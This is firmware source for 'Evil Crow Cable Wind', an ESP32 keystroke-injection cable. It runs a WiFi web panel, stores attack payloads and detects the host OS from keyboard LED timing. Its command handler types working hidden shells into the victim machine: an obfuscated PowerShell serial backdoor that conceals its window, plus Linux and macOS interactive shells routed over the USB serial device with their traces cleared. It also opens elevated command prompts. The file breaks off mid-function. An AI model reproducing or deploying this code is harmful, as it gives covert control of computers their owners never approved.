#include <WiFiClient.h>
#include <WiFi.h>
#include <ESPmDNS.h>
#include <WiFiServer.h>
#include <WebServer.h>
#include <LittleFS.h>
#include <HTTPUpdateServer.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include "index.h"
#include "livepayload.h"
#include "uploadpayload.h"
#include "style.h"
#include "javascript.h"
#include "config.h"
#include "readfile.h"
#include "listpayloads.h"
#include "autoexecplanning.h"
#include <ArduinoJson.h>
#include <map>

// Config default SSID, password and channel
String ssid = "Evil Crow Cable Wind";  // Enter your SSID here
String password = "123456789";         //Enter your Password here
char *serverIP;
int serverPort = 4444;

// Global variables
String cmd;
char Command[255];
String tmp_key;
int payload_state = 0;
String livepayload;
bool payloadExecuted = false;
const bool formatOnFail = true;
String FileName;
String FileList;
String vendorID, productID, manufacturerName, productName;
String os;
volatile bool led_response_received = false;
volatile int led_event_count = 0;
volatile unsigned long led_event_time = 0;
volatile bool caps_status = false;
volatile bool num_status = false;
volatile bool scroll_status = false;
volatile bool numlock_checked = false;
volatile bool os_detection_complete = false;
unsigned long caps_sent_time = 0;
unsigned long num_sent_time = 0;
unsigned long scroll_sent_time = 0;
unsigned long caps_delay = 0;
unsigned long num_delay = 0;
unsigned long scroll_delay = 0;
const unsigned char *selected_layout = en_us;  // Default to EN_US

File fsUploadFile;
WebServer controlserver(80);
WiFiServer tcpServer(12345);
WiFiClient clientServer;
HTTPUpdateServer httpUpdater;
USBCDC USBSerial;
USBHIDKeyboard Keyboard;

enum HostOS {
  OS_UNKNOWN,
  OS_WINDOWS,
  OS_LINUX,
  OS_MACOS,
  OS_IOS,
  OS_ANDROID
};

enum MetadataField {
    META_NAME,
    META_DESCRIPTION,
    META_OS
};

HostOS detected_os = OS_UNKNOWN;

extern const unsigned char en_us[128];
extern const unsigned char es_es[128];
extern const unsigned char fr_fr[128];
extern const unsigned char it_it[128];
extern const unsigned char da_dk[128];
extern const unsigned char de_de[128];
extern const unsigned char hr_hr[128];
extern const unsigned char hu_hu[128];
extern const unsigned char pt_pt[128];
extern const unsigned char pt_br[128];
extern const unsigned char be_be[128];
extern const unsigned char br_br[128];
extern const unsigned char ca_ca[128];
extern const unsigned char ca_fr[128];
extern const unsigned char sk_sk[128];
extern const unsigned char cz_cz[128];
extern const unsigned char sv_se[128];
extern const unsigned char si_si[128];

std::map<String, const unsigned char *> layoutMapInit = {
  { "EN_US", en_us },
  { "ES_ES", es_es },
  { "FR_FR", fr_fr },
  { "IT_IT", it_it },
  { "DA_DK", da_dk },
  { "DE_DE", de_de },
  { "HR_HR", hr_hr },
  { "HU_HU", hu_hu },
  { "PT_PT", pt_pt },
  { "PT_BR", pt_br },
  { "BE_BE", be_be },
  { "BR_BR", br_br },
  { "CA_CA", ca_ca },
  { "CA_FR", ca_fr },
  { "SK_SK", sk_sk },
  { "CZ_CZ", cz_cz },
  { "SV_SE", sv_se },
  { "SI_SI", si_si },
};

std::map<String, uint8_t> keyMap = {
  { "KEY_LEFT_ALT", KEY_LEFT_ALT },
  { "KEY_LEFT_GUI", KEY_LEFT_GUI },
  { "KEY_LEFT_CTRL", KEY_LEFT_CTRL },
  { "KEY_LEFT_SHIFT", KEY_LEFT_SHIFT },
  { "KEY_RIGHT_ALT", KEY_RIGHT_ALT },
  { "KEY_RIGHT_GUI", KEY_RIGHT_GUI },
  { "KEY_RIGHT_CTRL", KEY_RIGHT_CTRL },
  { "KEY_RIGHT_SHIFT", KEY_RIGHT_SHIFT },
  { "KEY_ENTER", KEY_RETURN },
  { "KEY_UP_ARROW", KEY_UP_ARROW },
  { "KEY_DOWN_ARROW", KEY_DOWN_ARROW },
  { "KEY_LEFT_ARROW", KEY_LEFT_ARROW },
  { "KEY_RIGHT_ARROW", KEY_RIGHT_ARROW },
  { "KEY_BACKSPACE", KEY_BACKSPACE },
  { "KEY_TAB", KEY_TAB },
  { "KEY_PAUSE", KEY_PAUSE },
  { "KEY_INSERT", KEY_INSERT },
  { "KEY_DELETE", KEY_DELETE },
  { "KEY_PAGE_UP", KEY_PAGE_UP },
  { "KEY_PAGE_DOWN", KEY_PAGE_DOWN },
  { "KEY_ESC", KEY_ESC },
  { "KEY_SPACE", KEY_SPACE },
  { "KEY_HOME", KEY_HOME },
  { "KEY_END", KEY_END },
  { "KEY_CAPS_LOCK", KEY_CAPS_LOCK },
  { "KEY_PRINT_SCREEN", KEY_PRINT_SCREEN },
  { "KEY_SCROLL_LOCK", KEY_SCROLL_LOCK },
  { "KEY_NUM_LOCK", KEY_NUM_LOCK },
  { "KEY_MENU", KEY_MENU },
  { "LED_NUMLOCK", LED_NUMLOCK },
  { "LED_CAPSLOCK", LED_CAPSLOCK },
  { "LED_SCROLLLOCK", LED_SCROLLLOCK },
  { "LED_COMPOSE", LED_COMPOSE },
  { "LED_KANA", LED_KANA },
  { "KEY_F1", KEY_F1 },
  { "KEY_F2", KEY_F2 },
  { "KEY_F3", KEY_F3 },
  { "KEY_F4", KEY_F4 },
  { "KEY_F5", KEY_F5 },
  { "KEY_F6", KEY_F6 },
  { "KEY_F7", KEY_F7 },
  { "KEY_F8", KEY_F8 },
  { "KEY_F9", KEY_F9 },
  { "KEY_F10", KEY_F10 },
  { "KEY_F11", KEY_F11 },
  { "KEY_F12", KEY_F12 }
};

void usbEventCallback(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
  if (event_base == ARDUINO_USB_HID_KEYBOARD_EVENTS) {
    arduino_usb_hid_keyboard_event_data_t *data = (arduino_usb_hid_keyboard_event_data_t *)event_data;

    if (event_id == ARDUINO_USB_HID_KEYBOARD_LED_EVENT) {
      led_response_received = true;
      led_event_count++;
      led_event_time = millis();

      caps_status = data->capslock != 0;
      num_status = data->numlock != 0;
      scroll_status = data->scrolllock != 0;
      numlock_checked = true;

      if (caps_sent_time > 0 && caps_delay == 0)
        caps_delay = led_event_time - caps_sent_time;
      if (num_sent_time > 0 && num_delay == 0)
        num_delay = led_event_time - num_sent_time;
      if (scroll_sent_time > 0 && scroll_delay == 0)
        scroll_delay = led_event_time - scroll_sent_time;
    }
  }
}

void ensureNumLock() {
  if (!numlock_checked) {
    return;
  }
  if (!num_status) {
    Keyboard.press(KEY_NUM_LOCK);
    delay(100);
    Keyboard.releaseAll();
  }
}

const char *ascii_convert(char c) {
  static char buffer[4];
  if (c >= 32 && c <= 126) {
    snprintf(buffer, sizeof(buffer), "%d", c);
    return buffer;
  }
  return "000";
}

void writeLetterWindows(const char *asciiCode) {
  Keyboard.press(KEY_LEFT_ALT);

  for (int i = 0; asciiCode[i] != '\0'; i++) {
    switch (asciiCode[i]) {
      case '0':
        Keyboard.press(KEY_KP_0);
        delay(2);
        Keyboard.release(KEY_KP_0);
        break;
      case '1':
        Keyboard.press(KEY_KP_1);
        delay(2);
        Keyboard.release(KEY_KP_1);
        break;
      case '2':
        Keyboard.press(KEY_KP_2);
        delay(2);
        Keyboard.release(KEY_KP_2);
        break;
      case '3':
        Keyboard.press(KEY_KP_3);
        delay(2);
        Keyboard.release(KEY_KP_3);
        break;
      case '4':
        Keyboard.press(KEY_KP_4);
        delay(2);
        Keyboard.release(KEY_KP_4);
        break;
      case '5':
        Keyboard.press(KEY_KP_5);
        delay(2);
        Keyboard.release(KEY_KP_5);
        break;
      case '6':
        Keyboard.press(KEY_KP_6);
        delay(2);
        Keyboard.release(KEY_KP_6);
        break;
      case '7':
        Keyboard.press(KEY_KP_7);
        delay(2);
        Keyboard.release(KEY_KP_7);
        break;
      case '8':
        Keyboard.press(KEY_KP_8);
        delay(2);
        Keyboard.release(KEY_KP_8);
        break;
      case '9':
        Keyboard.press(KEY_KP_9);
        delay(2);
        Keyboard.release(KEY_KP_9);
        break;
    }
  }
  Keyboard.release(KEY_LEFT_ALT);
  delay(5);
}

void writeLineWindows(const char *str) {
  ensureNumLock();

  while (*str) {
    const char *code = ascii_convert(*str);
    writeLetterWindows(code);
    str++;
    delay(2);
  }
  Keyboard.press(KEY_NUM_LOCK);
  delay(100);
  Keyboard.releaseAll();
}

void toggleKey(uint8_t key, unsigned long *send_time) {
  *send_time = millis();
  led_response_received = false;

  Keyboard.press(key);
  delay(300);
  Keyboard.release(key);
  delay(800);
}

void resetKeyboardLEDs() {
  unsigned long temp_time;
  delay(500);
  if (caps_status) {
    toggleKey(KEY_CAPS_LOCK, &temp_time);
    delay(800);
  }
  if (num_status) {
    toggleKey(KEY_NUM_LOCK, &temp_time);
    delay(800);
  }
  if (scroll_status) {
    toggleKey(KEY_SCROLL_LOCK, &temp_time);
    delay(800);
  }
}

void detectHostOS() {
  led_event_count = 0;
  caps_status = num_status = scroll_status = 0;
  caps_delay = num_delay = scroll_delay = 0;
  caps_sent_time = num_sent_time = scroll_sent_time = 0;
  led_response_received = false;
  uint8_t initial_caps = caps_status;
  toggleKey(KEY_CAPS_LOCK, &caps_sent_time);
  delay(1500);

  if (!led_response_received && caps_status != initial_caps) {
    detected_os = OS_IOS;
    return;
  }

  toggleKey(KEY_NUM_LOCK, &num_sent_time);
  delay(1200);
  toggleKey(KEY_SCROLL_LOCK, &scroll_sent_time);
  delay(1200);

  if (led_event_count == 0) {
    detected_os = (caps_status != initial_caps) ? OS_IOS : OS_MACOS;
  } else if (led_event_count >= 3 && caps_delay < 100 && num_delay < 100 && scroll_delay < 100) {
    detected_os = OS_WINDOWS;
  } else {
    bool has_numlock_response = (num_delay > 0);
    bool has_scrolllock_response = (scroll_delay > 0);

    if (num_status && !scroll_status && has_numlock_response && !has_scrolllock_response) {
      detected_os = OS_LINUX;
    } else if ((caps_delay > 200 || num_delay > 200 || scroll_delay > 200) && (has_numlock_response || has_scrolllock_response)) {
      detected_os = OS_ANDROID;
    } else if (caps_status != initial_caps) {
      detected_os = OS_IOS;
    } else {
      detected_os = OS_UNKNOWN;
    }
  }
}

void printDetectedOS() {
  switch (detected_os) {
    case OS_WINDOWS:
      os = "Windows";
      break;
    case OS_LINUX:
      os = "Linux";
      break;
    case OS_MACOS:
      os = "macOS";
      break;
    case OS_IOS:
      os = "iOS";
      break;
    case OS_ANDROID:
      os = "Android";
      break;
    default:
      os = "OS Unknown";
      break;
  }
  os_detection_complete = true;
}

void onDetectOSRequested() {
  resetKeyboardLEDs();
  detectHostOS();
  resetKeyboardLEDs();
  printDetectedOS();
}

void deleteFile(fs::FS &fs, const String &path) {
  if (fs.remove(path)) {
    controlserver.send(200, "text/plain", "File deleted successfully");
  } else {
    controlserver.send(500, "text/plain", "Failed to delete file");
  }
}

void readFile(fs::FS &fs, const String &path) {
  String payloadContent = "";
  String payloadDescription = readPayloadMetadata(path, META_DESCRIPTION);

  File file = fs.open(path);
  if (!file || file.isDirectory()) {
    FileList = "Failed to open file";
    return;
  }
  while (file.available()) {
    payloadContent += file.readString();
  }
  file.close();

  if (path == "") {
    FileList = "File name is empty";
    return;
  }

  // Set layout based on payload content
  setLayoutFromPayload(payloadContent);

  livepayload = payloadContent;
  
  FileList = StaticFileList;
  FileList.replace("{{path}}", path);
  FileList.replace("{{payloadContent}}", payloadContent);
  FileList.replace("{{payloadDescription}}", payloadDescription);
}


// Helper function to save payload metadata - UPDATED to handle multi-line
void savePayloadMetadata(const String &filename, const String &name, const String &description, const String &os) {
  String metaPath = filename + ".meta";
  File metaFile = LittleFS.open(metaPath, FILE_WRITE);
  if (metaFile) {
    // Write name (first line) - create a local copy to trim
    String trimmedName = name;
    trimmedName.trim();
    metaFile.println(trimmedName);

    // Write osType - to filter the listpayloads
    String trimmedOS = os;
    trimmedOS.trim();
    metaFile.println(trimmedOS);

    // Write description - trim and clean up line endings
    String cleanDesc = description;
    cleanDesc.trim(); // Trim both ends
    cleanDesc.replace("\r\n", "\n"); // Normalize line endings
    metaFile.print(cleanDesc); // Don't add extra newline at end

    metaFile.close();
  }
}

// Helper function to read payload metadata - UPDATED for multi-line
String readPayloadMetadata(const String &filename, MetadataField field) {
    String metaPath = filename + ".meta";

    if (!LittleFS.exists(metaPath)) {
        if (field == META_NAME) {
            int lastSlash = filename.lastIndexOf('/');
            return filename.substring(lastSlash + 1);
        } else if (field == META_DESCRIPTION) {
            return "No description";
        } else {
            return "unknown";
        }
    }

    File metaFile = LittleFS.open(metaPath, FILE_READ);
    if (!metaFile) {
        if (field == META_NAME) {
            int lastSlash = filename.lastIndexOf('/');
            return filename.substring(lastSlash + 1);
        } else if (field == META_DESCRIPTION) {
            return "No description";
        } else {
            return "unknown";
        }
    }

    String lines[3];  // name, os, description
    for (int i = 0; i < 3 && metaFile.available(); i++) {
        if (i == 2) { // Description field
            String desc;
            while (metaFile.available()) {
                desc += metaFile.readString();
            }
            desc.trim(); // Ensure no leading/trailing whitespace
            lines[i] = desc;
        } else {
            lines[i] = metaFile.readStringUntil('\n');
            lines[i].trim();
        }
    }

    metaFile.close();

    switch (field) {
        case META_NAME:
            return lines[0].length() > 0 ? lines[0] : filename.substring(filename.lastIndexOf('/') + 1);
        case META_OS:
            return lines[1].length() > 0 ? lines[1] : "unknown";
        case META_DESCRIPTION:
            return lines[2].length() > 0 ? lines[2] : "No description";
        default:
            return "";
    }
}

// Updated handleFileUpload to properly handle multi-line descriptions
void handleFileUpload() {
  HTTPUpload &upload = controlserver.upload();
  static const uint32_t MAX_FILE_SIZE = 204800;  // 200KB limit
  static uint32_t totalUploaded = 0;
  static String payloadName, payloadDescription, fileName, payloadOS;

  if (upload.status == UPLOAD_FILE_START) {
    totalUploaded = 0;
    payloadName = controlserver.arg("payloadName");
    payloadDescription = controlserver.arg("payloadDescription");
    payloadOS = controlserver.arg("payloadOS");

    // Get filename from upload, not from args
    fileName = upload.filename;

    if (!fileName.endsWith(".txt")) {
      controlserver.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Only .txt files allowed\"}");
      return;
    }

    if (!fileName.startsWith("/")) {
      fileName = "/payloads/" + fileName;
    }

    if (!LittleFS.exists("/payloads")) {
      LittleFS.mkdir("/payloads");
    }

    fsUploadFile = LittleFS.open(fileName, "w");
    if (!fsUploadFile) {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Cannot create file\"}");
      return;
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    totalUploaded += upload.currentSize;
    if (totalUploaded > MAX_FILE_SIZE) {
      fsUploadFile.close();
      LittleFS.remove(fsUploadFile.name());
      controlserver.send(413, "application/json", "{\"status\":\"error\",\"message\":\"File exceeded size limit\"}");
      return;
    }

    if (fsUploadFile) {
      fsUploadFile.write(upload.buf, upload.currentSize);
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close();
      // Save metadata with complete description
      savePayloadMetadata(fileName, payloadName, payloadDescription, payloadOS);
    }
  } else {
    if (fsUploadFile) {
      fsUploadFile.close();
      LittleFS.remove(fsUploadFile.name());
    }
    controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Upload failed\"}");
  }
}

void listDir(fs::FS &fs, const char *dirname, uint8_t levels) {
  FileList = StaticListPayloads;

  File root = fs.open(dirname);
  if (!root || !root.isDirectory()) {
    FileList += "<br>Empty<br></body></html>";
    return;
  }

  File file = root.openNextFile();
  while (file) {
    String fileName = "/payloads/";
    fileName += file.name();

    // Skip metadata files
    if (fileName.endsWith(".meta")) {
      file = root.openNextFile();
      continue;
    }

    String payloadName = readPayloadMetadata(fileName, META_NAME);
    String osType = readPayloadMetadata(fileName, META_OS);
    String payloadDesc = readPayloadMetadata(fileName, META_DESCRIPTION);
    
    // Truncate description to first two lines or 120 characters
    int newlinePos = payloadDesc.indexOf('\n');
    if (newlinePos != -1) {
      int secondNewline = payloadDesc.indexOf('\n', newlinePos + 1);
      if (secondNewline != -1) {
        payloadDesc = payloadDesc.substring(0, secondNewline) + "...";
      }
    } else if (payloadDesc.length() > 120) {
      payloadDesc = payloadDesc.substring(0, 120) + "...";
    }

    FileList += "<div class='payload-item' data-os='" + osType + "'>";
    FileList += "<a class=\"pyaloadButton\" href=\"/showpayload?payload=" + fileName + "\">" + payloadName + "</a>";
    FileList += "<div class='payload-desc'>" + payloadDesc + "</div>";
    FileList += "<div class='payload-filename'>" + String(file.name()) + " - OS Type: "+ osType +"</div>";
    FileList += "</div>";

    file = root.openNextFile();
  }
  FileList += "</body></html>";
}

void handleStats() {
  String json = "{";
  json += "\"uptime\":" + String(millis() / 1000);
  json += ",\"cpu0\":" + String(getCpuFrequencyMhz());
  json += ",\"cpu1\":" + String(getXtalFrequencyMhz());
  json += ",\"totalspiffs\":" + String(LittleFS.totalBytes());
  json += ",\"usedspiffs\":" + String(LittleFS.usedBytes());
  json += ",\"freespiffs\":" + String(LittleFS.totalBytes() - LittleFS.usedBytes());
  json += ",\"temperature\":" + String(temperatureRead());
  json += ",\"totalram\":" + String(ESP.getHeapSize());
  json += ",\"freeram\":" + String(ESP.getFreeHeap());
  json += ",\"os\":\"" + os + "\"";
  json += ",\"ssid\":\"" + WiFi.SSID() + "\"";
  json += ",\"ipaddress\":\"" + WiFi.localIP().toString() + "\"";
  json += "}";
  controlserver.send(200, "application/json", json);
}

void handleUpdateHostname() {
  if (controlserver.hasArg("hostname")) {
    String newHostname = controlserver.arg("hostname");

    File fsUploadFile = LittleFS.open("/hostname_config.txt", FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "application/json", "{\"success\":false,\"message\":\"Failed to save hostname\"}");
      return;
    }

    fsUploadFile.println(newHostname);
    fsUploadFile.close();
    controlserver.send(200, "application/json", "{\"success\":true,\"message\":\"Hostname updated successfully! Device will restart.\"}");
    delay(1000);
    ESP.restart();
  } else {
    controlserver.send(400, "application/json", "{\"success\":false,\"message\":\"No hostname provided\"}");
  }
}

void handleGetHostname() {
  String currentHostname = "cable-wind";  // default

  if (LittleFS.exists("/hostname_config.txt")) {
    File fsUploadFile = LittleFS.open("/hostname_config.txt", FILE_READ);
    if (fsUploadFile) {
      currentHostname = fsUploadFile.readStringUntil('\n');
      currentHostname.trim();
      fsUploadFile.close();
    }
  }

  controlserver.send(200, "text/plain", currentHostname);
}

// Function to parse and set layout from payload content
void setLayoutFromPayload(const String &payloadContent) {
  int layoutPos = payloadContent.indexOf("# Layout: ");

  if (layoutPos != -1) {
    int start = layoutPos + 10;
    int end = payloadContent.indexOf('\n', start);
    if (end == -1) {
      end = payloadContent.length();
    }
    String tmp_layout = payloadContent.substring(start, end);
    tmp_layout.trim();

    if (layoutMapInit.find(tmp_layout) != layoutMapInit.end()) {
      selected_layout = layoutMapInit[tmp_layout];
      Keyboard.setLayout(selected_layout);
      return;  // Exit after setting layout from payload
    }
  }

  // Fallback to saved layout if no layout specified in payload
  if (LittleFS.exists("/layout_config.txt")) {
    File fsUploadFile = LittleFS.open("/layout_config.txt", FILE_READ);
    if (fsUploadFile) {
      String layoutKey = fsUploadFile.readStringUntil('\n');
      layoutKey.trim();
      fsUploadFile.close();

      auto it = layoutMapInit.find(layoutKey);
      if (it != layoutMapInit.end()) {
        selected_layout = it->second;
        Keyboard.setLayout(selected_layout);
      }
    }
  }
}

// Function to get the currently selected layout
String getCurrentLayout() {
  String currentLayout = "en_us";  // Default to EN_US

  if (LittleFS.exists("/layout_config.txt")) {
    File fsUploadFile = LittleFS.open("/layout_config.txt", FILE_READ);
    if (fsUploadFile) {
      currentLayout = fsUploadFile.readStringUntil('\n');
      currentLayout.trim();
      fsUploadFile.close();
    }
  }

  return currentLayout;
}

// Function to save the layout configuration to a file
void saveLayoutConfig(const String &layout) {
  File fsUploadFile = LittleFS.open("/layout_config.txt", FILE_WRITE);
  if (!fsUploadFile) {
    controlserver.send(500, "text/plain", "Failed to open file for writing");
    return;
  }

  fsUploadFile.println(layout);
  fsUploadFile.close();
}

void payloadExec() {
  if (cmd.startsWith("RunMac ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.println(Command + 7);
  }

  else if (cmd.startsWith("RunLauncher ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F2);
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.println(Command + 12);
  }

  else if (cmd.startsWith("RunNix ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.print("t");
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.println(Command + 7);
  }

  else if (cmd.startsWith("RunWin ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print('r');
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.println(Command + 7);
  }

  else if (cmd.startsWith("ShellWin ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    serverIP = Command + 9;

    if (!clientServer.connect(serverIP, serverPort)) {
      while (1)
        ;
    }

    delay(3000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("r");
    delay(100);
    Keyboard.releaseAll();
    delay(200);
    Keyboard.println("powershell");
    delay(1000);
    Keyboard.print("Start-Job -ScriptBlock { $a = [System.IO.Ports.SerialPort]::GetPortNames(); $p = New-Object System.IO.Ports.SerialPort $a[$a.Length-1], 115200, None, 8, one; $p.DtrEnable = $true; [array]$mk = \"I\", \"f\", \"E\", \"x\", \"X\"; Set-Alias f $($mk | ForEach-Object { if ($_ -cmatch '[A-Z]') { $x += $_ } }; $x); $p.Open(); Start-Sleep -Seconds 2; while ($true) { $c = $p.ReadLine(); if ($c -eq \"exit\") { break }; $o = f \"$c\"; $p.WriteLine($o); $p.WriteLine(\"END_OF_COMMAND\") }; $p.Close() };function Hide-ConsoleWindow() {$ShowWindowAsyncCode='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);';$ShowWindowAsync=Add-Type -MemberDefinition $ShowWindowAsyncCode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru;$hwnd=(Get-Process -PID $pid).MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}else{$UniqueWindowTitle=New-Guid;$Host.UI.RawUI.WindowTitle=$UniqueWindowTitle;$StringBuilder=New-Object System.Text.StringBuilder 1024;$TerminalProcess=(Get-Process | Where-Object { $_.MainWindowTitle -eq $UniqueWindowTitle });$hwnd=$TerminalProcess.MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}}};Hide-ConsoleWindow");
    delay(1000);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("ShellNix ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    serverIP = Command + 9;

    if (!clientServer.connect(serverIP, serverPort)) {
      while (1)
        ;
    }

    delay(3000);

    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.print("t");
    delay(100);
    Keyboard.releaseAll();
    delay(500);
    Keyboard.println("sh -i > /dev/serial/by-id/*Espressif_Systems_ESP32S3* 2>&1 < /dev/serial/by-id/*Espressif_Systems_ESP32S3*");
  }

  else if (cmd.startsWith("ServerConnect ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    // the server IP is extracted from the Command array starting from the 14th index
    serverIP = Command + 14;

    // connect loop
    if (!clientServer.connect(serverIP, serverPort)) {
      while (1)
        ;
    }
  }

  else if (cmd.startsWith("ShellMac ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    serverIP = Command + 9;

    // connect loop
    if (!clientServer.connect(serverIP, serverPort)) {
      while (1)
        ;
    }

    delay(3000);

    // run spotlight/alfred prompt
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    delay(100);
    Keyboard.releaseAll();

    delay(1000);
    // type terminal
    Keyboard.print("terminal");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    // open new terminal tab, just in case there is terminal open with some chars - make greenlandi (press optin+t)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("t");
    delay(100);
    Keyboard.releaseAll();

    // compressed payload
    Keyboard.println("sh -c 'D=$(ls -t /dev/cu.usbmodem* 2>/dev/null | head -n1) && exec 196<>$D; bash -i >&$D 0<&196 2>&196' &");

    // payload keyboard press event cleanup
    delay(100);
    Keyboard.releaseAll();

    // hide visible output on terminal
    Keyboard.println("clear");
    delay(100);
    Keyboard.releaseAll();

    // hide terminal (option+h)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("h");
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("ShellMacCleanup")) {
    cmd.toCharArray(Command, cmd.length() + 1);

    delay(3000);

    // terminal cleanup - close tab

    // run spotlight/alfred prompt
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    delay(100);
    Keyboard.releaseAll();

    delay(1000);
    // type terminal
    Keyboard.print("terminal");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    // cloease tab - option + w
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("w");
    delay(100);
    Keyboard.releaseAll();

    // enter, in case of alert window
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    // hide terminal (option+h)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("h");
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "AltF2") {
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F2);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "CtrlAltT") {
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.print("t");
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "GuiR") {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("r");
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "Gui") {
    Keyboard.press(KEY_LEFT_GUI);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "GuiSpace") {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd == "DetectOS") {
    onDetectOSRequested();
  }

  else if (cmd.startsWith("PrintLine ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.println(Command + 10);
  }

  else if (cmd.startsWith("WinPrintLine ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    writeLineWindows(Command + 13);
    delay(10);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("Print ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.print(Command + 6);
  }

  else if (cmd.startsWith("WinPrint ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    writeLineWindows(Command + 9);
  }

  else if (cmd.startsWith("Press ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    tmp_key = Command + 6;
    char key = tmp_key[0];
    cmd.remove(0, 6);

    if (keyMap.find(cmd) != keyMap.end()) {
      uint8_t keyCode = keyMap[cmd];
      Keyboard.press(keyCode);
    } else {
      uint8_t keyCode = (uint8_t)key;
      Keyboard.press(keyCode);
    }
  }

  else if (cmd.startsWith("PressRelease ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    tmp_key = Command + 13;
    char key = tmp_key[0];
    cmd.remove(0, 13);

    if (keyMap.find(cmd) != keyMap.end()) {
      uint8_t keyCode = keyMap[cmd];
      Keyboard.press(keyCode);
      delay(100);
      Keyboard.releaseAll();
    } else {
      uint8_t keyCode = (uint8_t)key;
      Keyboard.press(keyCode);
      delay(100);
      Keyboard.releaseAll();
    }
  }

  else if (cmd.startsWith("Release")) {
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("Delay ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    delay(atoi(Command + 6));
  }

  else if (cmd.startsWith("RunPowershellAdmin")) {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("x");
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.print("a");
    delay(3000);
    Keyboard.press(KEY_LEFT_ARROW);
    delay(100);
    Keyboard.releaseAll();
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("RunCmdAdmin")) {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("r");
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.print("cmd");
    delay(2000);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.press(KEY_LEFT_ARROW);
    delay(100);
    Keyboard.releaseAll();
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
  }
}

void handleUpdateWiFi() {
  if (controlserver.hasArg("ssid") && controlserver.hasArg("password")) {
    String newSSID = controlserver.arg("ssid");
    String newPassword = controlserver.arg("password");

    File fsUploadFile = LittleFS.open("/wifi_config.txt", FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to open file for writing\"}");
      return;
    }

    fsUploadFile.println(newSSID);
    fsUploadFile.println(newPassword);
    fsUploadFile.close();
    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Wi-Fi config applied successfully! Device will restart.\"}");
